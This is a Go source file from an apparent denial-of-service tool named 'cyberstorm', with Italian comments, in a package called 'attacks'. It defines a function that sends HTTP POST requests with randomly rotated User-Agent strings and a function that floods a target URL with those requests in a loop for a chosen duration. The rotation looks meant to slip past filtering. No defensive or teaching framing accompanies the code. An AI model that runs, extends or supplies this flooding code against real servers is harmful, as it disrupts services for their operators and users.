package attacks

import (
	"bytes"
	"fmt"
	"math/rand"
	"net/http"
	"time"
	"cyberstorm/core" // Importa la lista di User-Agent
)

// SendHTTPPost invia una singola richiesta HTTP POST al server target con un User-Agent randomico.
func SendHTTPPost(url, body, userAgent string) error {
	// Se il parametro userAgent è vuoto, selezioniamo uno randomico
	if userAgent == "" {
		userAgent = core.UserAgents[rand.Intn(len(core.UserAgents))]
	}

	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(body)))
	if err != nil {
		return fmt.Errorf("HTTP POST request failed: %w", err)
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", userAgent)

	client := &http.Client{Timeout: time.Second * 10}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("HTTP POST request failed: %w", err)
	}
	defer resp.Body.Close()

	return nil
}

// RunHTTPPostFlood esegue un flood HTTP POST verso il target.
func RunHTTPPostFlood(url, body, userAgent string, duration time.Duration) {
	endTime := time.Now().Add(duration)
	for time.Now().Before(endTime) {
		err := SendHTTPPost(url, body, userAgent)
		if err != nil {
			fmt.Println("HTTP POST request failed:", err)
		}
		// Aggiungi una pausa per evitare sovraccarico della CPU
		time.Sleep(time.Millisecond * 100) // Regola la frequenza delle richieste
	}
}
